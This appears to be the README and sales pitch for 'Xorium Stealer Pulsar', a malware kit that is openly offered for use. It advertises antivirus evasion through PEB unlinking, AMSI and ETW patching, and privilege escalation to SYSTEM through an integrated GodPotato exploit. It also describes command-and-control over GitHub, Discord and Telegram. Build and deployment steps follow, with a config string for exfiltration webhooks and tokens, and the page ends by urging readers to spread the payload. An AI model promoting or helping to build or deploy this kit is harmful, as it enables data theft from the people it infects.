## 💀 WHY CHOOSE XORIUM?

You are tired of paying for "FUD" crypters that get detected in 24 hours. You are tired of Webhooks getting banned.
**Xorium Stealer Pulsar** is not just a stealer. It is a **Military-Grade Cyber Weapon**.

We combined the raw power of **C# .NET** with the invisibility of **Rust Assembly**.
The result? A malware that doesn't just steal—it **DOMINATES**.

## ⚡ KEY SELLING POINTS (The "God" Features)

### 1. 👻 PROJECT SHADOW (True Invisibility)
Most stealers are caught by heuristics. Xorium uses a **Custom Rust Stealth Core** (`shadow_core.dll`).
- **PEB Unlinking**: The DLL removes itself from the Process Environment Block immediately upon load. It effectively "vanishes" from the module list.
- **AMSI Patching**: Locates and neutralizes `AmsiScanBuffer` in memory. Bypasses in-memory scanning.
- **ETW Blindness**: Patches `EtwEventWrite` in `ntdll.dll` to return success without logging. Blinds behavioral analysis tools.

### 2. 👑 GOD POWER (Instant SYSTEM Access)
Why run as a user when you can run as **GOD**?
- **Integrated GodPotato**: We have integrated the legendary `GodPotato` exploit.
- **Auto-Escalate**: User -> `NT AUTHORITY\SYSTEM` in milliseconds.
- **Command Dominance**: Execute any command with the highest privileges available on Windows.

### 3. 🕸️ DYSTOPIA C2 (Unbannable Infra)
Forget buying servers. Forget Tor. Xorium turns legitimate platforms into your C2.
- **GitHub RAT**: Uses Public/Private Repos as a C2.
- **Discord & Telegram**: Classic, reliable, blazing fast webhooks.

## 🚀 HOW TO DEPLOY (Start Your Empire)

### Step 1: Forge the Shadow Core (Rust)
You need the **Visual Studio C++ Build Tools** installed.
1.  Navigate to `shadow-main`:
    ```cmd
    cd shadow-main
    ```
2.  Compile the stealth module:
    ```cmd
    cargo build --release
    ```
3.  This generates `shadow_core.dll` in `target/release/`. This is your invisible rootkit.

### Step 2: Build the Loader (C#)
1.  Open `Xorium Stealer Pulsar.sln` in Visual Studio.
2.  Build the `Stub` project (Release Mode).
3.  **Merge**: Place `shadow_core.dll` next to your specific Loader executable, or use ILMerge to bundle them if configured.

### Step 3: Configure & Spread
Xorium Config String:
`DiscordWebhook|TelegramToken|ChatID|GitHubToken|GitHubRepo`

spread the payload. Watch the logs flood in.
